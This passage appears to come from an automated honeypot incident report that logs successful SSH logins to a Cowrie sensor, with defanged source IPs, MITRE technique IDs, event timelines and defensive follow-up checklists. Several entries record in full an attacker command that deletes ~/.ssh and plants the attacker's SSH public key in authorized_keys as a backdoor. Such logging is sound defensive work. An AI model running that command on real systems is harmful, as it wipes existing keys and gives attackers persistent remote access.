- [ ] Block `183.82.120[.]244` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52b43a25cb04

| Field | Detail |
|---|---|
| **Source IP** | `183.82.120[.]244` |
| **First Seen** | 2026-06-12 13:24 |
| **Last Seen** | 2026-06-12 13:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:24:10` | `cowrie.session.connect` |
| `2026-06-12 13:24:10` | `cowrie.client.version` |
| `2026-06-12 13:24:10` | `cowrie.client.kex` |
| `2026-06-12 13:24:10` | `cowrie.login.success` |
| `2026-06-12 13:24:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.82.120[.]244` to AbuseIPDB if not already reported
- [ ] Block `183.82.120[.]244` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f5108eeace0

| Field | Detail |
|---|---|
| **Source IP** | `178.255.72[.]35` |
| **First Seen** | 2026-06-12 13:24 |
| **Last Seen** | 2026-06-12 13:24 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:24:50` | `cowrie.session.connect` |
| `2026-06-12 13:24:50` | `cowrie.client.version` |
| `2026-06-12 13:24:51` | `cowrie.client.kex` |
| `2026-06-12 13:24:51` | `cowrie.login.success` |
| `2026-06-12 13:24:51` | `cowrie.session.params` |
| `2026-06-12 13:24:51` | `cowrie.command.input` |
| `2026-06-12 13:24:51` | `cowrie.command.failed` |
| `2026-06-12 13:24:52` | `cowrie.log.closed` |
| `2026-06-12 13:24:52` | `cowrie.session.params` |
| `2026-06-12 13:24:52` | `cowrie.command.input` |
| `2026-06-12 13:24:52` | `cowrie.session.file_download` |
| `2026-06-12 13:24:52` | `cowrie.log.closed` |
| `2026-06-12 13:24:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.255.72[.]35` to AbuseIPDB if not already reported
- [ ] Block `178.255.72[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0eff586b651

| Field | Detail |
|---|---|
| **Source IP** | `178.255.72[.]35` |
| **First Seen** | 2026-06-12 13:24 |
| **Last Seen** | 2026-06-12 13:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:24:54` | `cowrie.session.connect` |
| `2026-06-12 13:24:54` | `cowrie.client.version` |
| `2026-06-12 13:24:54` | `cowrie.client.kex` |
| `2026-06-12 13:24:55` | `cowrie.login.success` |
| `2026-06-12 13:24:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.255.72[.]35` to AbuseIPDB if not already reported
- [ ] Block `178.255.72[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d3d1a7d91f3

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]80` |
| **First Seen** | 2026-06-12 13:25 |
| **Last Seen** | 2026-06-12 13:25 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:25:07` | `cowrie.session.connect` |
| `2026-06-12 13:25:07` | `cowrie.client.version` |
| `2026-06-12 13:25:07` | `cowrie.client.kex` |
| `2026-06-12 13:25:08` | `cowrie.login.success` |
| `2026-06-12 13:25:08` | `cowrie.session.params` |
| `2026-06-12 13:25:08` | `cowrie.command.input` |
| `2026-06-12 13:25:08` | `cowrie.command.failed` |
| `2026-06-12 13:25:09` | `cowrie.log.closed` |
| `2026-06-12 13:25:09` | `cowrie.session.params` |
| `2026-06-12 13:25:09` | `cowrie.command.input` |
| `2026-06-12 13:25:09` | `cowrie.session.file_download` |
| `2026-06-12 13:25:09` | `cowrie.log.closed` |
| `2026-06-12 13:25:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]80` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45a18032041d

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]80` |
| **First Seen** | 2026-06-12 13:25 |
| **Last Seen** | 2026-06-12 13:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:25:12` | `cowrie.session.connect` |
| `2026-06-12 13:25:12` | `cowrie.client.version` |
| `2026-06-12 13:25:12` | `cowrie.client.kex` |
| `2026-06-12 13:25:13` | `cowrie.login.success` |
| `2026-06-12 13:25:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]80` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10fb0d9b01d8

| Field | Detail |
|---|---|
| **Source IP** | `122.35.192[.]61` |
| **First Seen** | 2026-06-12 13:28 |
| **Last Seen** | 2026-06-12 13:28 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:28:41` | `cowrie.session.connect` |
| `2026-06-12 13:28:41` | `cowrie.client.version` |
| `2026-06-12 13:28:41` | `cowrie.client.kex` |
| `2026-06-12 13:28:41` | `cowrie.login.success` |
| `2026-06-12 13:28:42` | `cowrie.session.params` |
| `2026-06-12 13:28:42` | `cowrie.command.input` |
| `2026-06-12 13:28:42` | `cowrie.command.failed` |
| `2026-06-12 13:28:42` | `cowrie.log.closed` |
| `2026-06-12 13:28:42` | `cowrie.session.params` |
| `2026-06-12 13:28:42` | `cowrie.command.input` |
| `2026-06-12 13:28:42` | `cowrie.session.file_download` |
| `2026-06-12 13:28:42` | `cowrie.log.closed` |
| `2026-06-12 13:28:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.35.192[.]61` to AbuseIPDB if not already reported
- [ ] Block `122.35.192[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85023c52c2da

| Field | Detail |
|---|---|
| **Source IP** | `122.35.192[.]61` |
| **First Seen** | 2026-06-12 13:28 |
| **Last Seen** | 2026-06-12 13:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:28:45` | `cowrie.session.connect` |
| `2026-06-12 13:28:45` | `cowrie.client.version` |
| `2026-06-12 13:28:45` | `cowrie.client.kex` |
| `2026-06-12 13:28:45` | `cowrie.login.success` |
| `2026-06-12 13:28:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.35.192[.]61` to AbuseIPDB if not already reported
- [ ] Block `122.35.192[.]61` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f3f5a3c4b78

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]80` |
| **First Seen** | 2026-06-12 13:29 |
| **Last Seen** | 2026-06-12 13:29 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:29:13` | `cowrie.session.connect` |
| `2026-06-12 13:29:13` | `cowrie.client.version` |
| `2026-06-12 13:29:13` | `cowrie.client.kex` |
| `2026-06-12 13:29:14` | `cowrie.login.success` |
| `2026-06-12 13:29:15` | `cowrie.session.params` |
| `2026-06-12 13:29:15` | `cowrie.command.input` |
| `2026-06-12 13:29:15` | `cowrie.command.failed` |
| `2026-06-12 13:29:15` | `cowrie.log.closed` |
| `2026-06-12 13:29:15` | `cowrie.session.params` |
| `2026-06-12 13:29:15` | `cowrie.command.input` |
| `2026-06-12 13:29:16` | `cowrie.session.file_download` |
| `2026-06-12 13:29:16` | `cowrie.log.closed` |
| `2026-06-12 13:29:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]80` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-877b3484a1e9

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]80` |
| **First Seen** | 2026-06-12 13:29 |
| **Last Seen** | 2026-06-12 13:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:29:19` | `cowrie.session.connect` |
| `2026-06-12 13:29:19` | `cowrie.client.version` |
| `2026-06-12 13:29:19` | `cowrie.client.kex` |
| `2026-06-12 13:29:20` | `cowrie.login.success` |
| `2026-06-12 13:29:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]80` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9dd983d9e84d

| Field | Detail |
|---|---|
| **Source IP** | `183.82.120[.]244` |
| **First Seen** | 2026-06-12 13:29 |
| **Last Seen** | 2026-06-12 13:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:29:35` | `cowrie.session.connect` |
| `2026-06-12 13:29:35` | `cowrie.client.version` |
| `2026-06-12 13:29:35` | `cowrie.client.kex` |
| `2026-06-12 13:29:35` | `cowrie.login.success` |
| `2026-06-12 13:29:35` | `cowrie.session.params` |
| `2026-06-12 13:29:35` | `cowrie.command.input` |
| `2026-06-12 13:29:35` | `cowrie.command.failed` |
| `2026-06-12 13:29:35` | `cowrie.log.closed` |
| `2026-06-12 13:29:35` | `cowrie.session.params` |
| `2026-06-12 13:29:35` | `cowrie.command.input` |
| `2026-06-12 13:29:35` | `cowrie.session.file_download` |
| `2026-06-12 13:29:35` | `cowrie.log.closed` |
| `2026-06-12 13:29:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.82.120[.]244` to AbuseIPDB if not already reported
- [ ] Block `183.82.120[.]244` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a04b30571874

| Field | Detail |
|---|---|
| **Source IP** | `183.82.120[.]244` |
| **First Seen** | 2026-06-12 13:29 |
| **Last Seen** | 2026-06-12 13:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:29:36` | `cowrie.session.connect` |
| `2026-06-12 13:29:36` | `cowrie.client.version` |
| `2026-06-12 13:29:36` | `cowrie.client.kex` |
| `2026-06-12 13:29:36` | `cowrie.login.success` |
| `2026-06-12 13:29:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.82.120[.]244` to AbuseIPDB if not already reported
- [ ] Block `183.82.120[.]244` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0bcbc4e3158

| Field | Detail |
|---|---|
| **Source IP** | `185.99.99[.]95` |
| **First Seen** | 2026-06-12 13:30 |
| **Last Seen** | 2026-06-12 13:30 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:30:24` | `cowrie.session.connect` |
| `2026-06-12 13:30:24` | `cowrie.client.version` |
| `2026-06-12 13:30:24` | `cowrie.client.kex` |
| `2026-06-12 13:30:25` | `cowrie.login.success` |
| `2026-06-12 13:30:25` | `cowrie.session.params` |
| `2026-06-12 13:30:25` | `cowrie.command.input` |
| `2026-06-12 13:30:25` | `cowrie.command.failed` |
| `2026-06-12 13:30:25` | `cowrie.log.closed` |
| `2026-06-12 13:30:26` | `cowrie.session.params` |
| `2026-06-12 13:30:26` | `cowrie.command.input` |
| `2026-06-12 13:30:26` | `cowrie.session.file_download` |
| `2026-06-12 13:30:26` | `cowrie.log.closed` |
| `2026-06-12 13:30:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.99.99[.]95` to AbuseIPDB if not already reported
- [ ] Block `185.99.99[.]95` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b253c440a452

| Field | Detail |
|---|---|
| **Source IP** | `185.99.99[.]95` |
| **First Seen** | 2026-06-12 13:30 |
| **Last Seen** | 2026-06-12 13:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:30:28` | `cowrie.session.connect` |
| `2026-06-12 13:30:28` | `cowrie.client.version` |
| `2026-06-12 13:30:29` | `cowrie.client.kex` |
| `2026-06-12 13:30:29` | `cowrie.login.success` |
| `2026-06-12 13:30:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.99.99[.]95` to AbuseIPDB if not already reported
- [ ] Block `185.99.99[.]95` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc328b3c5189

| Field | Detail |
|---|---|
| **Source IP** | `185.99.99[.]95` |
| **First Seen** | 2026-06-12 13:32 |
| **Last Seen** | 2026-06-12 13:33 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:32:58` | `cowrie.session.connect` |
| `2026-06-12 13:32:58` | `cowrie.client.version` |
| `2026-06-12 13:32:58` | `cowrie.client.kex` |
| `2026-06-12 13:32:59` | `cowrie.login.success` |
| `2026-06-12 13:32:59` | `cowrie.session.params` |
| `2026-06-12 13:32:59` | `cowrie.command.input` |
| `2026-06-12 13:32:59` | `cowrie.command.failed` |
| `2026-06-12 13:32:59` | `cowrie.log.closed` |
| `2026-06-12 13:33:00` | `cowrie.session.params` |
| `2026-06-12 13:33:00` | `cowrie.command.input` |
| `2026-06-12 13:33:00` | `cowrie.session.file_download` |
| `2026-06-12 13:33:00` | `cowrie.log.closed` |
| `2026-06-12 13:33:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.99.99[.]95` to AbuseIPDB if not already reported
- [ ] Block `185.99.99[.]95` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e719528987a7

| Field | Detail |
|---|---|
| **Source IP** | `185.99.99[.]95` |
| **First Seen** | 2026-06-12 13:33 |
| **Last Seen** | 2026-06-12 13:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:33:02` | `cowrie.session.connect` |
| `2026-06-12 13:33:02` | `cowrie.client.version` |
| `2026-06-12 13:33:03` | `cowrie.client.kex` |
| `2026-06-12 13:33:03` | `cowrie.login.success` |
| `2026-06-12 13:33:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.99.99[.]95` to AbuseIPDB if not already reported
- [ ] Block `185.99.99[.]95` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c60b222ec54

| Field | Detail |
|---|---|
| **Source IP** | `210.79.191[.]76` |
| **First Seen** | 2026-06-12 13:35 |
| **Last Seen** | 2026-06-12 13:35 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:35:34` | `cowrie.session.connect` |
| `2026-06-12 13:35:34` | `cowrie.client.version` |
| `2026-06-12 13:35:34` | `cowrie.client.kex` |
| `2026-06-12 13:35:35` | `cowrie.login.success` |
| `2026-06-12 13:35:35` | `cowrie.session.params` |
| `2026-06-12 13:35:35` | `cowrie.command.input` |
| `2026-06-12 13:35:35` | `cowrie.command.failed` |
| `2026-06-12 13:35:35` | `cowrie.log.closed` |
| `2026-06-12 13:35:36` | `cowrie.session.params` |
| `2026-06-12 13:35:36` | `cowrie.command.input` |
| `2026-06-12 13:35:36` | `cowrie.session.file_download` |
| `2026-06-12 13:35:36` | `cowrie.log.closed` |
| `2026-06-12 13:35:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.79.191[.]76` to AbuseIPDB if not already reported
- [ ] Block `210.79.191[.]76` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6e31aee9fc0

| Field | Detail |
|---|---|
| **Source IP** | `210.79.191[.]76` |
| **First Seen** | 2026-06-12 13:35 |
| **Last Seen** | 2026-06-12 13:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:35:38` | `cowrie.session.connect` |
| `2026-06-12 13:35:38` | `cowrie.client.version` |
| `2026-06-12 13:35:38` | `cowrie.client.kex` |
| `2026-06-12 13:35:39` | `cowrie.login.success` |
| `2026-06-12 13:35:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.79.191[.]76` to AbuseIPDB if not already reported
- [ ] Block `210.79.191[.]76` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c60c624fb091

| Field | Detail |
|---|---|
| **Source IP** | `122.35.192[.]61` |
| **First Seen** | 2026-06-12 13:36 |
| **Last Seen** | 2026-06-12 13:36 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
